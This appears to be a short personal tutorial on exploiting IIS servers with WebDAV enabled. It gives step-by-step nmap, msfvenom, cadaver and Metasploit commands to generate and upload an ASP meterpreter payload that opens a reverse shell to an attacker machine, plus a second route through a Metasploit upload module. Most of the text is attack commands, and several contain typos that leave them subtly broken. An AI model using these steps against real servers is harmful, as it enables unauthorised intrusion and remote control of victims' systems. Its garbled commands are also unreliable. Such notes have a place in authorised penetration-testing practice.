## Exploiting Microsoft IIS Server using webdev
## Exploiting webdev with metasploit
---
 Get IP
---
```
nmap -sV -p 80 --script=http-enum IP
```

Now, after nmap result we can know that webdev is running or not in IIS server

---

so, To exploit IIS server using webdev. We have generate payload using masvenom
```
msfvenom -p windows/meterpreter/reverse_tcp/ LHOST=attackerMachineIP LPORT=attacckerMachinePORT(1234) -f asp > shell.asp
```
now we successfylly create payload with of asp file

after creating payload.
upload in webdev server
```
- cadaver http:victimIP/webdev
- put payloat/path
```
---

now start msfconsole and also postgresql
```
  service postgresql start && msfconsole 
	- use multi/handler
	- set payload windows/meterpreter/reverse_tcp
	- set LHSOT attackerMachineIP
	- set LPORT attackerMachinePORT(1234)
	- run
 ```
 ---

Now, search in browser http://victimIP/webdev. After this click on, then we will meterpreter session 

---
Another way to exploit
after running msfconsole
```
- search iis upload
- use exploit/windows/iis/iis_webdev_upload_asp
- show options
```
we have to provide http webdev credentials
```
- set RHOST Victim IP
- set PATH /webdev/matasploits
- exploit
```
What ever fliles are upload in webdev that all automatically deleted
when we do mannually using cadaver then we have to delete it mannually

```
delete shell.asp
```
